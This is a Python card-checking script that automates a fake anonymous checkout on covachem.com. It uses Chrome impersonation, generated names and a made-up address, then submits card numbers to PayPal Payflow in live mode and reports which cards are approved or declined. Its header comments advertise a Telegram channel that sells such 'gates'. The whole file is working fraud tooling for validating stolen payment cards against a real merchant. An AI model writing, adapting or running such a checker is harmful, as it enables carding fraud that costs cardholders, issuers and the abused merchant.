import asyncio
import re
from curl_cffi import AsyncSession
from faker import Faker
from colorama import init, Fore

# =============================== Code by @SammSmithxd ===============================
# =============================== UNETE: https://t.me/RemasteredChat ===============================
# =============================== compra tus gates personales aca: https://t.me/ApiSiteshop ===============================
async def processCard(cardInput):
    init()
    faker = Faker()
    firstName = faker.first_name()
    lastName = faker.last_name()
    email = faker.email(domain="gmail.com")
    parts = cardInput.replace("/", "|").split("|")
    cardNumber = parts[0]
    expMonth = parts[1].zfill(2)
    expYear = parts[2][-2:]
    await asyncio.sleep(30)
    print("processing...")
    async with AsyncSession(impersonate="chrome136", verify=False, timeout=7, proxy=None) as session: #cambiar None con tu proxy
        # ===================== req1 ==================
        req1 = await session.get(
            url="https://www.covachem.com/hplc-grade-water-h2o.html",
            timeout=7
        )
        # ===================== req2 ==================
        header = {
            "accept": "*/*",
            "accept-language": "es-ES,es;q=0.9,en;q=0.8",
            "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
            "origin": "https://www.covachem.com",
            "priority": "u=1, i",
            "referer": "https://www.covachem.com/hplc-grade-water-h2o.html",
            "sec-ch-ua": '"Google Chrome";v="137", "Chromium";v="137", "Not/A)Brand";v="24"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-origin",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36",
            "x-requested-with": "XMLHttpRequest",
        }
        dataAddToCart = {
            "mode": "add",
            "productid": "17691",
            "cat": "",
            "page": "",
            "product_options[527]": "4345",
            "amount": "1",
        }
        req2 = await session.post(
            url="https://www.covachem.com/cart.php",
            headers=header,
            data=dataAddToCart,
            timeout=7
        )
        # ===================== req3 ==================
        header2 = {
            "accept": "*/*",
            "accept-language": "es-ES,es;q=0.9,en;q=0.8",
            "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
            "origin": "https://www.covachem.com",
            "priority": "u=1, i",
            "referer": "https://www.covachem.com/cart.php?mode=checkout",
            "sec-ch-ua": '"Google Chrome";v="137", "Chromium";v="137", "Not/A)Brand";v="24"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-origin",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36",
            "x-requested-with": "XMLHttpRequest",
        }
        paramsCheckout = {
            "mode": "checkout",
        }
        dataCheckout = {
            "usertype": "C",
            "anonymous": "Y",
            "address_book[B][title]": "Mr.",
            "address_book[B][firstname]": firstName,
            "address_book[B][lastname]": lastName,
            "address_book[B][address]": "Street 515",
            "address_book[B][address_2]": "",
            "address_book[B][city]": "Chelsea",
            "address_book[B][state]": "NY",
            "address_book[B][country]": "US",
            "address_book[B][zipcode]": "10001",
            "address_book[B][phone]": "2056677988",
            "address_book[B][no_address]": "",
            "address_book[S][title]": "Mr.",
            "address_book[S][firstname]": "",
            "address_book[S][lastname]": "",
            "address_book[S][address]": "",
            "address_book[S][address_2]": "",
            "address_book[S][city]": "",
            "address_book[S][state]": "IL",
            "address_book[S][country]": "US",
            "address_book[S][zipcode]": "",
            "address_book[S][phone]": "",
            "address_book[S][no_address]": "",
            "email": email,
            "password_is_modified": "N",
            "passwd1": "",
            "passwd2": "",
            "title": "Mr.",
            "firstname": firstName,
            "lastname": lastName,
            "company": "samm",
            "url": "",
        }
        req3 = await session.post(
            url="https://www.covachem.com/cart.php",
            headers=header2,
            params=paramsCheckout,
            data=dataCheckout,
            timeout=7
        )
        # ===================== req4 ==================
        header3 = {
            "accept": "*/*",
            "accept-language": "es-ES,es;q=0.9,en;q=0.8",
            "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
            "origin": "https://www.covachem.com",
            "priority": "u=1, i",
            "referer": "https://www.covachem.com/cart.php?mode=checkout",
            "sec-ch-ua": '"Google Chrome";v="137", "Chromium";v="137", "Not/A)Brand";v="24"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-origin",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36",
            "x-requested-with": "XMLHttpRequest",
        }
        paramsPayment = {
            "open_in_layer": "Y",
            "is_ajax_request": "Y",
            "keep_https": "Y",
        }
        dataPayment = {
            "paymentid": "20",
            "action": "place_order",
            "payment_method": "Credit or Debit card",
            "Customer_Notes": "",
            "accept_terms": "Y",
        }
        req4 = await session.post(
            url="https://www.covachem.com/payment/payment_cc.php",
            headers=header3,
            params=paramsPayment,
            data=dataPayment,
            timeout=7
        )
        payResp = req4.text
        secTokMatch = re.search(r'SECURETOKEN=([^&"]+)', payResp)
        secTokIdMatch = re.search(r'SECURETOKENID=([^&"]+)', payResp)
        secTok = secTokMatch.group(1) if secTokMatch else None
        secTokId = secTokIdMatch.group(1) if secTokIdMatch else None
        # ===================== req5 ==================
        header4 = {
            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
            "accept-language": "es-ES,es;q=0.9,en;q=0.8",
            "priority": "u=0, i",
            "referer": "https://www.covachem.com/",
            "sec-ch-ua": '"Google Chrome";v="137", "Chromium";v="137", "Not/A)Brand";v="24"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"',
            "sec-fetch-dest": "iframe",
            "sec-fetch-mode": "navigate",
            "sec-fetch-site": "cross-site",
            "sec-fetch-storage-access": "active",
            "sec-fetch-user": "?1",
            "upgrade-insecure-requests": "1",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36",
        }
        paramsPayflow = {
            "SECURETOKEN": secTok,
            "SECURETOKENID": secTokId,
            "MODE": "LIVE",
        }
        req5 = await session.get(
            url="https://payflowlink.paypal.com/",
            headers=header4,
            params=paramsPayflow,
            timeout=7
        )
        payflowResp = req5.text
        csrfTokMatch = re.search(r'<input name="CSRF_TOKEN" type="hidden" value="([^"]+)"/>', payflowResp)
        csrfTok = csrfTokMatch.group(1) if csrfTokMatch else None
        # ===================== req6 ==================
        header5 = {
            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
            "accept-language": "es-ES,es;q=0.9,en;q=0.8",
            "cache-control": "max-age=0",
            "content-type": "application/x-www-form-urlencoded",
            "origin": "https://payflowlink.paypal.com",
            "priority": "u=0, i",
            "referer": f"https://payflowlink.paypal.com/?SECURETOKEN={secTok}&SECURETOKENID={secTokId}&MODE=LIVE",
            "sec-ch-ua": '"Google Chrome";v="137", "Chromium";v="137", "Not/A)Brand";v="24"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"',
            "sec-fetch-dest": "iframe",
            "sec-fetch-mode": "navigate",
            "sec-fetch-site": "same-origin",
            "sec-fetch-storage-access": "active",
            "sec-fetch-user": "?1",
            "upgrade-insecure-requests": "1",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36",
        }
        dataProcess = [
            ("subaction", ""),
            ("CARDNUM", cardNumber),
            ("EXPMONTH", expMonth),
            ("EXPYEAR", expYear),
            ("startdate_month", ""),
            ("startdate_year", ""),
            ("issue_number", ""),
            ("METHOD", "C"),
            ("PAYMETHOD", "C"),
            ("FIRST_NAME", firstName),
            ("LAST_NAME", lastName),
            ("template", "MINLAYOUT"),
            ("ADDRESS", "Street 515"),
            ("CITY", "Chelsea"),
            ("STATE", "NY"),
            ("ZIP", "10001"),
            ("COUNTRY", "US"),
            ("PHONE", "2056677988"),
            ("EMAIL", email),
            ("SHIPPING_FIRST_NAME", firstName),
            ("SHIPPING_LAST_NAME", lastName),
            ("ADDRESSTOSHIP", "Street 515"),
            ("CITYTOSHIP", "Chelsea"),
            ("STATETOSHIP", "NY"),
            ("ZIPTOSHIP", "10001"),
            ("COUNTRYTOSHIP", "US"),
            ("PHONETOSHIP", ""),
            ("EMAILTOSHIP", ""),
            ("TYPE", "S"),
            ("SHIPAMOUNT", "30.00"),
            ("TAX", "0.00"),
            ("INVOICE", secTokId),
            ("DISABLERECEIPT", "TRUE"),
            ("flag3dSecure", ""),
            ("CURRENCY", "USD"),
            ("STATE", "NY"),
            ("swipeData", "0"),
            ("SECURETOKEN", secTok),
            ("SECURETOKENID", secTokId),
            ("PARMLIST", ""),
            ("MODE", "LIVE"),
            ("CSRF_TOKEN", csrfTok),
            ("referringTemplate", "minlayout"),
        ]
        print("waiting...")
        req6 = await session.post(
            url="https://payflowlink.paypal.com/processTransaction.do",
            headers=header5,
            data=dataProcess,
            timeout=7
        )
        fResp = req6.text
        respMsgMatch = re.search(r'<input type="hidden" name="RESPMSG" value="([^"]+)"/>', fResp)
        avsDataMatch = re.search(r'<input type="hidden" name="AVSDATA" value="([^"]+)"/>', fResp)
        respMsg = respMsgMatch.group(1) if respMsgMatch else "Unknown"
        avsData = avsDataMatch.group(1) if avsDataMatch else "Unknown"
        if respMsg == "Approved":
            print(Fore.LIGHTGREEN_EX + f"{cardInput} => APPROVED AVS [{avsData}]" + Fore.RESET)
        elif respMsg.startswith(("Declined:", "Invalid account number:")):
            message = respMsg.split(":", 1)[1].strip()
            print(Fore.RED + f"{cardInput} --> DECLINED => RESPONSE: {message} AVS [{avsData}]" + Fore.RESET)
        else:
            print(Fore.RED + f"{cardInput} --> DECLINED => RESPONSE: {respMsg} AVS [{avsData}]" + Fore.RESET)
async def ready():
    while True:
        cardInput = input("cc|mm|yy|cvv: ")
        if not cardInput:
            break
        await processCard(cardInput)
if __name__ == "__main__":
    asyncio.run(ready())